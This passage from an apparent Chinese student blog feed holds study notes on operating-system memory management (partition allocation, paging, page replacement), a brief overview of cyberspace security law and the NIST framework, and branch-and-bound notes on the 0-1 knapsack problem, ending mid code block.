aria-hidden="true">首次适应算法</figcaption></figure><h3 id="最佳适应best-fitbf算法">最佳适应(best fit，BF)算法</h3><p>算法思想：由于动态分区分配是一种连续分配方式，为各进程分配的空间必须是连续的一整片区域。因此为了保证当“大进程”到来时能有连续的大片空间，可以尽可能多地留下大片的空闲区即，优先使用更小的空闲区。</p><p>如何实现：空闲分区按容量递增次序链接。每次分配内存时顺序查找空闲分区链(或空闲分区表)，找到大小能满足要求的第一个空闲分区。</p><ul><li>“最佳”含义：每次为作业分配内存时，总是把能满足要求、又是最小的空闲分区分配给作业，避免内存浪费</li></ul><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312192053532.png"alt="最佳适应算法" /><figcaption aria-hidden="true">最佳适应算法</figcaption></figure><p>缺点：每次都选最小的分区进行分配，会留下越来越多的、很小的、难以利用的内存块。因此这种方法会产生很多的外部碎片。</p><h3 id="最坏适应worst-fitwf算法">最坏适应(worst fit，WF)算法</h3><blockquote><p>WF算法使得存储器中缺乏大的空闲分区，故把它称为是最坏适应算法</p></blockquote><p>算法思想：为了解决最佳适应算法的问题一一即留下太多难以利用的小碎片，可以在每次分配时优先使用最大的连续空闲区，这样分配后剩余的空闲区就不会太小，更方便使用。</p><p>如何实现：空闲分区按容量递减次序链接。每次分配内存时顺序查找空闲分区链(或空闲分区表)，找到大小能满足要求的第一个空闲分区。</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312192100348.png"alt="1702990837242" /><figcaption aria-hidden="true">1702990837242</figcaption></figure><p>缺点：每次都选最大的分区进行分配，虽然可以让分配后留下的空闲区更大，更可用，但是这种方式会导致较大的连续空闲区被迅速用完。如果之后有“大进程”到达，就没有内存分区可用了</p><h3 id="邻近适应算法">邻近适应算法</h3><p>算法思想：首次适应算法每次都从链头开始查找的。这可能会导致低地址部分出现很多小的空闲分区，而每次分配查找时，都要经过这些分区，因此也增加了查找的开销。如果每次都从上次查找结束的位置开始检索，就能解决上述问题。</p><p>如何实现：空闲分区以地址递增的顺序排列(可排成一个循环链表)。每次分配内存时从上次查找结束的位置开始查找空闲分区链(或空闲分区表)，找到大小能满足要求的第一个空闲分区。</p><p>首次适应算法每次都要从头查找，每次都需要检索低地址的小分区。但是这种规则也决定了当低地址部分有更小的分区可以满足需求时，会更有可能用到低地址部分的小分区，也会更有可能把高地址部分的大分区保留下来(这隐含了最佳适应算法的优点)</p><p>邻近适应算法的规则可能会导致无论低地址、高地址部分的空闲分区都有相同的概率被使用，也就导致了高地址部分的大分区更可能被使用，划分为小分区，最后导致无大分区可用(这隐含了最大适应算法的缺点)</p><p>综合来看，四种算法中，首次适应算法的效果反而更好</p><p><strong>四种算法的比较总结</strong></p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312192109218.png"alt="四种算法的比较总结" /><figcaption aria-hidden="true">四种算法的比较总结</figcaption></figure><p>这里是算法开销指的是对分区表或分区链表的重新排序和查找消费</p><hr /><blockquote><p>张老师的pipiti上面是这样分的，或者说书上是这样来分类的：</p></blockquote><p>🎈基于顺序搜索的动态分区分配算法：</p><ul><li>首次适应(first fit，FF)算法</li><li>循环首次适应(next fit，NF)算法<ul><li>目的：避免低址部分留下许多很小的空闲分区，以及减少查找可用空闲分区的开销</li><li>NF算法在为进程分配内存空间时，不再是每次都从链首开始查找，而是从上次找到的空闲分区的下一个空闲分区开始查找，直至找到一个能满足要求的空闲分区，从中划出一块与请求大小相等的内存空间分配给作业。</li><li>其实就是上面提到的邻近适应算法</li></ul></li><li>最佳适应(best fit，BF)算法</li><li>最坏适应(worst fit，WF)算法</li></ul><p>🎈基于索引搜索的动态分区分配算法：</p><ul><li><strong>快速适应(quick fit)算法</strong></li></ul><p>将空闲分区根据其容量大小进行分类，对于每一类具有相同容量的所有空闲分区，单独设立一个空闲分区链表，这样系统中存在多个空闲分区链表</p><p>在内存中设立一张管理索引表，其中的每一个索引表项对应了一种空闲分区类型，并记录了该类型空闲分区链表表头的指针</p><ul><li><strong>伙伴系统(buddy system)</strong></li></ul><p>该算法规定，无论已分配分区或空闲分区，其大小均为2的k次幂(k为整数，k∈[1,m])。<spanclass="math inline">\(2^m\)</span>是整个可分配内存的大小</p><p>假设系统的可用空间容量为<spanclass="math inline">\(2^m\)</span>个字，则系统开始运行时整个内存区是一个大小为<spanclass="math inline">\(2^m\)</span>的空闲分区。在系统运行过程中，由于不断地划分，将会形成若干个不连续的空闲分区</p><p>将这些空闲分区按分区的大小进行分类。对于具有相司大小的所有空闲分区，单独设立一个空闲分区双向链表，这样，不同大小的空闲分区形成了多个空闲分区链表</p><p>在伙伴系统中，对于一个大小为<span class="math inline">\(2^k\)</span>，地址为<spanclass="math inline">\(x\)</span>的内存块，其伙伴块的地址则用<spanclass="math inline">\(buddy_k(x)\)</span>表示，其计算公式为： <spanclass="math display">\[buddy_k(x)=\left\{\begin{matrix}x+2^k（若x\mod2^{k+1}=0）\\x-2^k（若x\mod2^{k+1}=2^k）\end{matrix}\right.\]</span></p><ul><li><strong>哈希算法</strong></li></ul><p>上述算法中都是将空闲分区根据分区大小进行分类，对于每一类具有相同大小的空闲分区，单独设立一个空闲分区链表</p><p>在为进程分配空间时，需要在一张管理索引表中查找到所需空间大小所对应的表项，从中得到对应的空闲分区链表表头指针</p><p>建立哈希函数，以内存分区大小为查找关键字，加快查找合适大小分区的速度</p><hr /><h2 id="基本分页存储管理">*3.1.6 基本分页存储管理</h2><p>思路：连续分配方式局限性大；可以将进程分散式的装入内存；根据分散分配时不同的地址空间基本单位分为：</p><ol type="1"><li><p>分页存储管理方式：将进程地址空间划分成“页”，例如，每页1KB</p></li><li><p>分段存储管理方式：将进程地址空间划分成逻辑上完整的“段”</p></li><li><p>段页式存储管理方式</p></li></ol><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312192259942.png"alt="内存管理" /><figcaption aria-hidden="true">内存管理</figcaption></figure><p><ahref="https://blog.csdn.net/weixin_43914604/article/details/105907291">3.1.6OS之分页存储（页号、页偏移量等）_计组的页内偏移量-CSDN博客</a></p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312261020437.png"alt="什么是分页存储" /><figcaption aria-hidden="true">什么是分页存储</figcaption></figure><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312261020412.png"alt="页表" /><figcaption aria-hidden="true">页表</figcaption></figure><p>思考：</p><ol type="1"><li>每个页表项多大?占几个字节?</li><li>如何通过页表实现逻辑地址到物理地址的转换?</li></ol><blockquote><p>这节课有点没听懂，看了期末考试好像对这部分要求的比较少，就先不查资料进行学习了😥😥</p><p>等期末考完再来补充，<del>没办法，一切以期末考试为导向进行学习</del></p></blockquote><h1 id="虚拟内存管理">3.2 虚拟内存管理</h1><h2 id="虚拟内存的基本概念">3.2.1 虚拟内存的基本概念</h2><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312261212892.png"alt="内存管理的概念" /><figcaption aria-hidden="true">内存管理的概念</figcaption></figure><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312261213046.png"alt="虚拟内存的基本概念" /><figcaption aria-hidden="true">虚拟内存的基本概念</figcaption></figure><h3 id="传统存储管理的特征缺点">1 传统存储管理的特征、缺点</h3><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312261216399.png"alt="传统存储管理方式" /><figcaption aria-hidden="true">传统存储管理方式</figcaption></figure><h3 id="局部性原理">2. 局部性原理</h3><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312261219841.png"alt="局部性原理" /><figcaption aria-hidden="true">局部性原理</figcaption></figure><h3 id="虚拟内存的定义和特征">3. 虚拟内存的定义和特征</h3><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312261221174.png"alt="虚拟内存的定义和特征" /><figcaption aria-hidden="true">虚拟内存的定义和特征</figcaption></figure><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312261222012.png"alt="虚拟内存的定义和特征" /><figcaption aria-hidden="true">虚拟内存的定义和特征</figcaption></figure><h3 id="如何实现虚拟内存技术">4. 如何实现虚拟内存技术</h3><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312261224437.png"alt="如何实现虚拟内存技术" /><figcaption aria-hidden="true">如何实现虚拟内存技术</figcaption></figure><h2 id="请求分页存储管理方式">3.2.2 请求分页存储管理方式</h2><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312261244941.png"alt="请求分页存储管理方式" /><figcaption aria-hidden="true">请求分页存储管理方式</figcaption></figure><h3 id="页表机制">1. 页表机制</h3><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312261247895.png"alt="页表机制" /><figcaption aria-hidden="true">页表机制</figcaption></figure><h3 id="缺页中断机构">2. 缺页中断机构</h3><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312261252647.png"alt="缺页中断机构" /><figcaption aria-hidden="true">缺页中断机构</figcaption></figure><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312261253589.png"alt="缺页中断机构" /><figcaption aria-hidden="true">缺页中断机构</figcaption></figure><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312261254874.png"alt="如果内存中没有空闲块" /><figcaption aria-hidden="true">如果内存中没有空闲块</figcaption></figure><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312261255259.png"alt="如果内存中没有空闲块" /><figcaption aria-hidden="true">如果内存中没有空闲块</figcaption></figure><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312261256813.png"alt="缺页中断" /><figcaption aria-hidden="true">缺页中断</figcaption></figure><h3 id="地址变换机构">3. 地址变换机构</h3><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312261258187.png"alt="地址变换机构" /><figcaption aria-hidden="true">地址变换机构</figcaption></figure><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312261259156.png"alt="地址变换机构" /><figcaption aria-hidden="true">地址变换机构</figcaption></figure><p>快表中有的页面一定是在内存中的。若某个页面被换出外存，则快表中的相应表项也要删除，否则可能访问错误的页面</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312261302424.png"alt="请求分页中的地址变换过程" /><figcaption aria-hidden="true">请求分页中的地址变换过程</figcaption></figure><p>在具有快表机构的请求分页系统中，访问一个逻辑地址时，若发生缺页，则地址变换步骤是：</p><p>查快表(未命中)——查慢表(发现未调入内存)——调页(调入的页面对应的表项会直接加入快表)——查快表(命中)——访问目标内存单元</p><h2 id="页面置换算法">3.2.3 页面置换算法</h2><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312261305716.png"alt="页面置换算法" /><figcaption aria-hidden="true">页面置换算法</figcaption></figure><h3 id="最佳置换算法opt">1. 最佳置换算法—OPT</h3><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312261309611.png"alt="最佳置换算法—OPT" /><figcaption aria-hidden="true">最佳置换算法—OPT</figcaption></figure><p>最佳置换算法可以保证最低的缺页率，但实际上，只有在进程执行的过程中才能知道接下来会访问到的是哪个页面。操作系统无法提前预判页面访问序列。因此，最佳置换算法是无法实现的。</p><h3 id="先进先出置换算法fifo">2. 先进先出置换算法—FIFO</h3><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312261312217.png"alt="先进先出置换算法—FIFO" /><figcaption aria-hidden="true">先进先出置换算法—FIFO</figcaption></figure><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312261313826.png"alt="先进先出置换算法—FIFO" /><figcaption aria-hidden="true">先进先出置换算法—FIFO</figcaption></figure><h3 id="最近最久未使用置换算法lru">3. 最近最久未使用置换算法—LRU</h3><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312261314449.png"alt="最近最久未使用置换算法—LRU" /><figcaption aria-hidden="true">最近最久未使用置换算法—LRU</figcaption></figure><p>该算法的实现需要专门的硬件支持，虽然算法性能好，但是实现困难，开销大</p><h3 id="时钟置换算法clock">4. 时钟置换算法—CLOCK</h3><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312261319805.png"alt="时钟置换算法—CLOCK" /><figcaption aria-hidden="true">时钟置换算法—CLOCK</figcaption></figure><p>访问6号页面时，需要淘汰某个页面，先从1检查，都会改成0，然后第二轮扫描时，发现1是0，所以6号页会置换1号页</p><p>7会置换2号页面（可以自己分析一下）</p><h3 id="改造型时钟置换算法">5. 改造型时钟置换算法</h3><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312261433749.png"alt="改造型时钟置换算法" /><figcaption aria-hidden="true">改造型时钟置换算法</figcaption></figure><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312261434567.png"alt="只需一轮" /><figcaption aria-hidden="true">只需一轮</figcaption></figure><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312261434429.png"alt="需要两轮" /><figcaption aria-hidden="true">需要两轮</figcaption></figure><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312261436182.png"alt="需要三轮" /><figcaption aria-hidden="true">需要三轮</figcaption></figure><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312261437134.png"alt="需要四轮的" /><figcaption aria-hidden="true">需要四轮的</figcaption></figure><h2 id="页面分配策略">3.2.4 页面分配策略</h2><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312261438059.png"alt="页面分配策略" /><figcaption aria-hidden="true">页面分配策略</figcaption></figure><h3 id="驻留集">1. 驻留集</h3><p>驻留集：指请求分页存储管理中给进程分配的物理块的集合</p><p>在采用了虚拟存储技术的系统中，驻留集大小一般小于进程的总大小</p><p>-----考虑一个极端情况，若某进程共有100个页面，则该进程的驻留集大小为100时进程可以全部放入内存，运行期间不可能再发生缺页。若驻留集大小为1，则进程运行期间必定会极频繁地缺页</p><ul><li>若驻留集太小，会导致缺页频繁，系统要花大量的时间来处理缺页，实际用于进程推进的时间很少</li><li>驻留集太大，又会导致多道程序并发度下降，资源利用率降低。所以应该选择一个合适的驻留集大小。</li></ul><h3 id="页面分配置换策略">2. 页面分配、置换策略</h3><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312261443427.png"alt="页面分配、置换策略" /><figcaption aria-hidden="true">页面分配、置换策略</figcaption></figure><ul><li>固定分配局部置换：系统为每个进程分配一定数量的物理块，在整个运行期间都不改变。若进程在运行中发生缺页，则只能从该进程在内存中的页面中选出一页换出，然后再调入需要的页面。<ul><li>这种策略的缺点是：很难在刚开始就确定应为每个进程分配多少个物理块才算合理。(采用这种策略的系统可以根据进程大小、优先级、或是根据程序员给出的参数来确定为一个进程分配的内存块数)</li></ul></li><li>可变分配全局置换：刚开始会为每个进程分配一定数量的物理块。操作系统会保持一个空闲物理块队列。当某进程发生缺页时，从空闲物理块中取出一块分配给该进程；若已无空闲物理块，则可选择一个<strong>未锁定</strong>的页面换出外存，再将该物理块分配给缺页的进程。采用这种策略时，只要某进程发生缺页都将获得新的物理块，仅当空闲物理块用完时，系统才选择一个未锁定的页面调出。被选择调出的页可能是系统中任何一个进程中的页，因此这个被选中的进程拥有的物理块会减少，缺页率会增加。<ul><li>系统会锁定一些页面，这些页面中的内容不能置换出外存(如：重要的内核数据可以设为“锁定”)</li></ul></li><li>可变分配局部置换：刚开始会为每个进程分配一定数量的物理块。当某进程发生缺页时，只允许从该进程自己的物理块中选出一个进行换出外存。如果进程在运行中频繁地缺页，系统会为该进程多分配几个物理块，直至该进程缺页率趋势适当程度；反之，如果进程在运行中缺页率特别低，则可适当减少分配给该进程的物理块。</li></ul><p>可变分配全局置换：只要缺页就给分配新物理块</p><p>可变分配局部置换：要根据发生缺页的频率来动态地增加或减少进程的物理块</p><h3 id="何时调入页面">3. 何时调入页面？</h3><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312261448361.png"alt="何时调入页面？" /><figcaption aria-hidden="true">何时调入页面？</figcaption></figure><h3 id="从何处调页">4. 从何处调页？</h3><ol type="1"><li><p>系统拥有足够的对换区空间</p><p>页面的调入、调出都是在内存与对换区之间进行，这样可以保证页面的调入、调出速度很快。在进程运行前需将进程相关的数据从文件区复制到对换区。</p></li></ol><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312261450403.png"alt="系统拥有足够的对换区空间" /><figcaption aria-hidden="true">系统拥有足够的对换区空间</figcaption></figure><ol start="2" type="1"><li><p>系统缺少足够的对换区空间</p><p>凡是不会被修改的数据都直接从文件区调入，由于这些页面不会被修改，因此换出时不必写回磁盘，下次需要时再从文件区调入即可。对于可能被修改的部分，换出时需写回磁盘对换区，下次需要时再从对换区调入。</p></li></ol><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312261452522.png"alt="系统缺少足够的对换区空间" /><figcaption aria-hidden="true">系统缺少足够的对换区空间</figcaption></figure><ol start="3" type="1"><li><p>UNIX 方式：</p><p>运行之前进程有关的数据全部放在文件区，故未使用过的页面，都可从文件区调入。若被使用过的页面需要换出，则写回对换区，下次需要时从对换区调入。</p></li></ol><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312261453380.png"alt="UNIX 方式" /><figcaption aria-hidden="true">UNIX 方式</figcaption></figure><h3 id="抖动颠簸现象">5. 抖动（颠簸）现象</h3><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312261453005.png"alt="抖动（颠簸）现象" /><figcaption aria-hidden="true">抖动（颠簸）现象</figcaption></figure><h3 id="工作集">6. 工作集</h3><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312261454788.png"alt="工作集" /><figcaption aria-hidden="true">工作集</figcaption></figure>]]></content>
    
    
    <categories>
      
      <category>操作系统</category>
      
    </categories>
    
    
    <tags>
      
      <tag>操作系统</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>网络空间安全法律法规</title>
    <link href="/2023/12/11/%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E5%AE%89%E5%85%A8%E6%B3%95%E5%BE%8B%E6%B3%95%E8%A7%84/"/>
    <url>/2023/12/11/%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E5%AE%89%E5%85%A8%E6%B3%95%E5%BE%8B%E6%B3%95%E8%A7%84/</url>
    
    <content type="html"><![CDATA[<blockquote><p>随便写点东西喵</p></blockquote><p><strong>信息安全的三层内涵</strong></p><p>信息安全有三个层次：<strong>信息（自身）的安全</strong>；<strong>信息系统的安全</strong>；信息安全和信息系统安全引致的<strong>传统（生命、财产、社会、心理等）安全</strong></p><p>网络空间四要素：</p><ul><li><p>网络空间载体( 设施 )</p></li><li><p>网络空间资源 ( 数据 )</p></li><li><p>网络活动主体( 用户;</p></li><li><p>网络活动形式( 操作)</p></li></ul><p>网络空间载体 : 设施，信息通信技术系统的集合</p><p>网络操作对象：数据，表达人类所能理解的意图的信号状态</p><p>网络活动主体 ：用户，网络活动的主体要素，属于人的代理</p><p>网络活动形式：操作，对数据的加工、存储、传输、展示等服务形式</p><p>网络空间的一般性定义 :网络空间是一种人造的电磁空间，其以互联网、各种通信系统与电信网、各种传播系统与广电网、各种计算机系统、各类关键工业设施中的嵌入式处理器和控制器等信息通信技术基础设施为<strong>载体</strong>，<strong>用户</strong>通过在其上对<strong>数据</strong>进行创造、存储、改变传输、使用、展示等<strong>操作</strong>，以实现特定的信息通信技术活动。</p><p>在这个定义中“载体"“数据”是在技术层面反映出“Cyber的属性;“用户”"操作”是在社会层面反映出“Space”的属性。</p><p>网络空间安全（cyberspace security）常常简称为网络安全（cybersecurity），但是要考虑到中英文的表述差别。例如，中华人民共和国国家互联网信息办公室网站的英文名称为：CyberspaceAdministration of China并不是是平时常见的NetworkSecurity（网络安全）。</p><p>“没有网络安全就没有国家安全”，其中的网络安全指的是cybersecurity，而不是network security。</p><p><strong>Framework for Improving Critical InfrastructureCybersecurity</strong></p><p><strong>网络空间安全管理的框架</strong></p><p><strong>一、识别（Identify）</strong></p><p>1、资产管理(Asset Management)</p><p>2、业务环境(Business Environment)</p><p>3、治理(Governance)</p><p>4、风险评估(Risk Assessment)</p><p>5、风险管理战略(Risk Management Strategy)。</p><p><strong>二、保护（Pro­tect）</strong></p><ol type="1"><li><p>访问控制(Access Control),</p></li><li><p>意识与培训 (Awareness and Training),</p></li><li><p>数据安全(Data Security),</p></li><li><p>信 息 保 护 过 程 与 规 程 ( I n f o r m a t i o nProtectionProcesses and Procedures),</p></li><li><p>维护(Maintenance),</p></li><li><p>保护技术(Protective Technology)</p></li></ol><p><strong>三、检测（Detect）</strong></p><p>1、异常与事件</p><p>2、安全持续监视</p><p>3、探测过程</p><p><strong>四、响应（Respond</strong>）</p><p>1、计划</p><p>2、沟通</p><p>3、分析</p><p>4、减缓</p><p>5、改进</p><p><strong>五、恢复（Recover）。</strong></p><p>1、恢复计划</p><p>2、改进</p><p>3、沟通</p><h2 id="中华人民共和国网络安全法">《中华人民共和国网络安全法》</h2><p><strong>2017年6月1日</strong>起实施。</p><h2 id="我国关键信息基础设施保护制度">我国关键信息基础设施保护制度</h2><p><strong>关键信息基础设施</strong>是指公共通信和信息服务、能源、交通、水利、金融、公共服务、电子政务、国防科技工业等重要行业和领域的，以及其他一旦遭到破坏、丧失功能或者数据泄露，可能严重危害国家安全、国计民生、公共利益的重要网络设施、信息系统等</p><p>关键信息基础设施是数字化社会运行的神经中枢，是网络安全保障的重中之重。当前，关键信息基础设施面临的严峻的安全形势，网络攻击威胁事件频发。</p>]]></content>
    
    
    
    <tags>
      
      <tag>网络空间安全法律法规</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>算法 7 分支界限法</title>
    <link href="/2023/12/06/%E7%AE%97%E6%B3%95%207-%E5%88%86%E6%94%AF%E7%95%8C%E9%99%90%E6%B3%95/"/>
    <url>/2023/12/06/%E7%AE%97%E6%B3%95%207-%E5%88%86%E6%94%AF%E7%95%8C%E9%99%90%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<blockquote><p>方法概述部分基本为老师PPT的内容，我™也有点看不懂，不知道是我太菜了，还是PPT不清楚🤧🤧🤧</p></blockquote><h2 id="方法概述">方法概述</h2><h3 id="与回溯法区别">与回溯法区别</h3><ul><li><p>求解目标不同</p><p>一般而言，回溯法的求解目标是找出解空间树中满足约束条件的所有解，而分支限界法的求解目标则是尽快地找出满足约束条件的一个解</p></li><li><p>搜索方法不同</p><p>回溯法使用深度优先方法搜索，而分支限界一般用宽度优先或最佳优先方法来搜索</p></li><li><p>对扩展结点的扩展方式不同</p><p>分支限界法中，每一个活结点只有一次机会成为扩展结点。活结点一旦成为扩展结点，就一次性产生其所有儿子结点;</p></li><li><p>存储空间的要求不同</p><p>分支限界法的存储空间比回溯法大得多，因此当内存容量有限时，回溯法解决问题成功的可能性更大。</p></li></ul><h3 id="分支界限法基本思想">分支界限法基本思想</h3><p>以广度优先或最小耗费（最大效益）优先的方式搜索问题的解空间树</p><ul><li>每个活结点只有一次机会成为扩展结点并一次性产生其所有儿子结点</li><li>儿子结点中导致不可行解或非最优解的儿子结点被舍弃，其余儿子结点被加入活结点表中。如是最小耗费优先，活结点表需要重新排序</li><li>此后从活结点表中取下一结点成为当前扩展结点，并重复上述结点扩展过程。这个过程一直持续到找到所需的解或活结点表为空时为止</li></ul><blockquote><p>分支限界法常以广度优先或以最小耗费（最大效益）优先的方式搜索问题的解空间树。1. 对已处理的各结点根据限界函数估算目标函数的可能取值 2.从中选出目标函数取得极大(极小) 值的结点优先进行广度优先搜索 3.不断地调整搜索方向，尽快找到解，裁剪那些不能得到最优解的子树以提高搜索效率</p></blockquote><p>搜索策略：</p><p>在扩展结点处，首先生成其所有的儿子结点（分支），然后从当前的活结点表中选择下一个扩展结点。思考：如何代码实现？</p><p>为了有效地选择下一个扩展结点，以加速搜索的进程，<strong>在每一个活结点处，计算一个函数值(优先值)，并根据这些已计算出的函数值，从当前活结点表中选择一个最有利的结点作为扩展结点，使搜索朝着解空间树上有最优解的分支推进，以便尽快地找出一个最优解</strong>。</p><h3 id="branch-and-bound求解步骤">Branch and Bound求解步骤：</h3><ol type="1"><li>定义解空间（对解编码）</li><li>确定解空间的树结构</li><li>按BFS等方式搜索<ol type="1"><li>每个活结点仅有一次机会变成扩展结点</li><li>由扩展结点生成一步可达（即宽度搜索）的新结点C</li><li>在新结点中，删除不可能导出最优解的结点； // 限界策略</li><li>将剩余的新结点加入活动表（队列）中</li><li>从活动表中选择结点再扩展； //分支策略</li><li>直至活动表为空</li></ol></li></ol><h3 id="常见的两种分支限界法">常见的两种分支限界法</h3><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312061720116.png"alt="image-20231206172054010" /><figcaption aria-hidden="true">image-20231206172054010</figcaption></figure><p>队列式（FIFO）分支限界法</p><ul><li>按照队列先进先出（FIFO）原则选取下一个结点为扩展结点</li><li>从活结点表中取出结点的顺序与加入结点的顺序相同，因此活结点表的性质与队列相同</li></ul><p>优先队列分支限界法（代价最小或效益最大）</p><ul><li>每个结点都有一个对应的耗费或收益，以此决定结点的优先级</li><li>从优先队列中选取优先级最高的结点成为当前扩展结点</li><li>如果查找一个具有最小耗费的解：则活结点表可用小顶堆来建立，下一个扩展结点就是具有最小耗费的活结点</li><li>如果希望搜索一个具有最大收益的解：则可用大顶堆来构造活结点表，下一个扩展结点是具有最大收益的活结点</li></ul><h2 id="背包问题">0-1背包问题</h2><h3 id="队列式fifo分支限界法">队列式（FIFO）分支限界法</h3><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312061532327.png"alt="队列式（FIFO）分支限界法解决0-1背包问题" /><figcaptionaria-hidden="true">队列式（FIFO）分支限界法解决0-1背包问题</figcaption></figure><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312061533668.png"alt="image-20231206153332482" /><figcaption aria-hidden="true">image-20231206153332482</figcaption></figure><p>通过判断重量加起来是否超过背包容量来判断是不是死节点</p><p>步骤：</p><p><strong>①</strong> 用一个队列存储活结点表，初始为空</p><p><strong>②</strong>A为当前扩展结点，其儿子结点B和C均为可行结点，将其按从左到右顺序加入活结点队列，并舍弃A。</p><p><strong>③</strong>按FIFO原则，下一扩展结点为B，其儿子结点D不可行，舍弃；E可行，加入。舍弃B</p><p><strong>④</strong>C为当前扩展结点，儿子结点F、G均为可行结点，加入活结点表，舍弃C</p><p><strong>⑤</strong>扩展结点E的儿子结点J不可行而舍弃；K为可行的叶结点，是问题的一个可行解，价值为45</p><p><strong>⑥</strong> 当前活结点队列的队首为F,儿子结点L、M为可行叶结点，价值为50、25</p><p><strong>⑦</strong>G为最后一个扩展结点，儿子结点N、O均为可行叶结点，其价值为25和0</p><p><strong>⑧</strong> 活结点队列为空，算法结束，其最优值为50</p><p>注：活结点就是不可再进行扩展的节点，也就是两个儿子还没有全部生成的节点</p><h3 id="优先队列分支限界法">优先队列分支限界法</h3><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312061550206.png"alt="优先队列分支限界法求解0-1背包问题" /><figcaptionaria-hidden="true">优先队列分支限界法求解0-1背包问题</figcaption></figure><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312061551301.png"alt="image-20231206155119099" /><figcaption aria-hidden="true">image-20231206155119099</figcaption></figure><p>步骤：</p><p><strong>①</strong>用一个极大堆表示活结点表的优先队列，其优先级定义为活结点所获得的价值。初始为空。</p><p><strong>②</strong>由A开始搜索解空间树，其儿子结点B、C为可行结点，加入堆中，舍弃A。</p><p><strong>③</strong>B获得价值40，C为0。B为堆中价值最大元素，并成为下一扩展结点。</p><p><strong>④</strong>B的儿子结点D是不可行结点，舍弃。E是可行结点，加入到堆中。舍弃B。</p><p><strong>⑤</strong> E的价值为40，是堆中最大元素，为当前扩展结点。</p><p><strong>⑥</strong>E的儿子J是不可行叶结点，舍弃。K是可行叶结点，为问题的一个可行解价值为40。</p><p><strong>⑦</strong>继续扩展堆中唯一活结点C，直至存储活结点的堆为空，算法结束。</p><p><strong>⑧</strong>算法搜索得到最优值为50，最优解为从根结点A到叶结点L的路径（0，1，1）。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//优先队列分支限界法解决0-1背包问题</span><br>branchknap(<span class="hljs-type">float</span> w[],<span class="hljs-type">float</span> v[])&#123;<br>    根结点入队<br>    <span 